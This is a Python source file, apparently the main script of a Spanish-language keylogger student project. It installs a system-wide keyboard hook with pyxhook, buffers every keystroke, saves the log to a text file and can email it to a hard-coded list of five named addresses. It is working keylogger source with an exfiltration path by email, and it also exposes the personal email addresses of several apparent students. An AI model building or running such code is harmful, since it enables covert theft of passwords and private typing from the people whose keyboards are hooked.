import time
import sys
import pyxhook

from keylogger_core import KeyloggerCore
from file_manager import guardar_en_archivo
from email_handler import enviar_email

def mostrar_menu() -> (bool, bool):
    """
    Muestra un menú en la terminal
    """
    print("============= Configuración del keylogger =============")
    print("Responde 'yes'/'y' para SÍ, 'no'/'n' para NO, o 'exit' para salir.\n")

    # 1) ¿Enviar por correo?
    while True:
        resp = input("¿Deseas enviar los registros por correo? (yes/y / no/n / exit): ").strip().lower()
        if resp == 'exit':
            sys.exit(0)
        elif resp in ('yes', 'y'):
            enviar = True
            break
        elif resp in ('no', 'n'):
            enviar = False
            break
        else:
            print("Entrada inválida. Ingresa yes/y, no/n o exit.\n")

    while True:
        resp = input("¿Deseas guardar los registros en texto plano? (yes/y / no/n / exit): ").strip().lower()
        if resp == 'exit':
            sys.exit(0)
        elif resp in ('yes', 'y'):
            guardar = True
            break
        elif resp in ('no', 'n'):
            guardar = False
            break
        else:
            print("Entrada inválida. Ingresa yes/y, no/n o exit.\n")

    # Si en ambas preguntas elegimos NO, terminamos
    if not enviar and not guardar:
        print("No se van a enviar ni guardar registros. Finalizando ejecución.")
        sys.exit(0)

    print()
    return enviar, guardar

def limpiar_pantalla_completa():
    """
    Envía la secuencia ANSI para 'limpiar pantalla' completa
    (\033c).
    """
    sys.stdout.write("\033c")
    sys.stdout.flush()

def main():
    enviar, guardar = mostrar_menu()
    logger = KeyloggerCore(enviar_correo=enviar, guardar_local=guardar)

    # Iniciar el hook 
    hookman = pyxhook.HookManager()
    hookman.KeyDown = logger.callback
    hookman.HookKeyboard()
    hookman.start()

    try:
        # Mientras logger.running sea True, esperamos en loop
        while logger.running:
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("\n[x] Interrupción manual (Ctrl+C).")
    finally:
        # Detener el hook
        hookman.cancel()

        limpiar_pantalla_completa()

        if guardar:
            archivo_generado = guardar_en_archivo(logger.buffer)
        else:
            archivo_generado = "output_temporal.txt"
            try:
                with open(archivo_generado, "w", encoding="utf-8") as f:
                    f.write(logger.buffer)
                print(f"[keylogger] Archivo temporal creado: {archivo_generado}")
            except Exception as e:
                print(f"[keylogger] Error al crear archivo temporal: {e}")
                archivo_generado = None

        if enviar and archivo_generado:
            destinatarios = [
                "arizdelcylizbeth1203@ciencias.unam.mx",
                "sofialatorre313@gmail.com",
                "damianvazqueztorrijos@ciencias.unam.mx",
                "IrvingAxel@ciencias.unam.mx",
                "lezama@ciencias.unam.mx"
            ]

            limpiar_pantalla_completa()

            for dest in destinatarios:
                try:
                    print(f"[email_handler] Enviando a {dest}…")
                    enviar_email(dest, archivo_generado)
                except Exception as e:
                    print(f"[email_handler] Error al enviar a {dest}: {e}")
            print("[email_handler] Finalizaron los envíos a todos los destinatarios.")

        elif enviar and not archivo_generado:
            print("No se generó ningún archivo para adjuntar; no se envían correos.")

        print("\n============= Keylogger finalizado. =============")

if __name__ == "__main__":
    main()
